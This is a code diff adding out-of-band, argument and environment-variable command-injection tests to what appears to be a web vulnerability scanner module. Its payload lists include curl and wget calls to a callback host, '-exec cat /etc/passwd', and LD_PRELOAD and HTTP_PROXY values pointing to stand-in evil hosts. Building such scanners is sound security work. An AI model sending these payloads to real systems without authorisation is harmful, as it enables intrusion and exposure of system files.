@@ -62,7 +62,92 @@ class CommandInjectionModule:
         
         # Test with different separators
         self._test_separators(url, method, param, value)
+        
+        # Test OOB command injection
+        self._test_oob_cmdi(url, method, param, value)
+        
+        # Test argument injection
+        self._test_argument_injection(url, method, param, value)
+        
+        # Test environment variable injection
+        self._test_env_injection(url, method, param, value)
     
+    def _test_oob_cmdi(self, url: str, method: str, param: str, value: str):
+        """Test OOB command injection"""
+        oob = self.engine.config.get('oob_domain', 'oob.callback.example.com')
+        payloads = [
+            f'; nslookup {oob}',
+            f'| curl http://{oob}/',
+            f'$(wget http://{oob}/)',
+        ]
+        for payload in payloads:
+            try:
+                data = {param: f"{value}{payload}"}
+                response = self.requester.request(url, method, data=data)
+                if response:
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique="Command Injection (OOB Exfiltration)",
+                        url=url, severity='INFO', confidence=0.4, param=param,
+                        payload=payload,
+                        evidence=f"OOB payload sent — verify at {oob}",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
+
+    def _test_argument_injection(self, url: str, method: str, param: str, value: str):
+        """Test argument injection"""
+        payloads = ['--output=/tmp/pwned', '-exec cat /etc/passwd ;', '--config=/dev/null']
+        indicators = ['root:x:', '/bin/bash', 'pwned']
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                text = response.text.lower()
+                for ind in indicators:
+                    if ind in text:
+                        from core.engine import Finding
+                        finding = Finding(
+                            technique="Command Injection (Argument Injection)",
+                            url=url, severity='HIGH', confidence=0.8, param=param,
+                            payload=payload,
+                            evidence=f"Argument injection indicator: {ind}",
+                        )
+                        self.engine.add_finding(finding)
+                        return
+            except Exception:
+                continue
+
+    def _test_env_injection(self, url: str, method: str, param: str, value: str):
+        """Test environment variable injection"""
+        payloads = [
+            'HTTP_PROXY=http://evil.example.com/',
+            'LD_PRELOAD=/tmp/evil.so',
+            'BASH_ENV=/etc/passwd',
+        ]
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                if 'root:x:' in response.text.lower() or 'evil.example.com' in response.text.lower():
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique="Command Injection (Environment Variable)",
+                        url=url, severity='MEDIUM', confidence=0.6, param=param,
+                        payload=payload,
+                        evidence="Environment variable injection possible",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
+
     def test_url(self, url: str):
         """Test URL for Command Injection"""
         pass
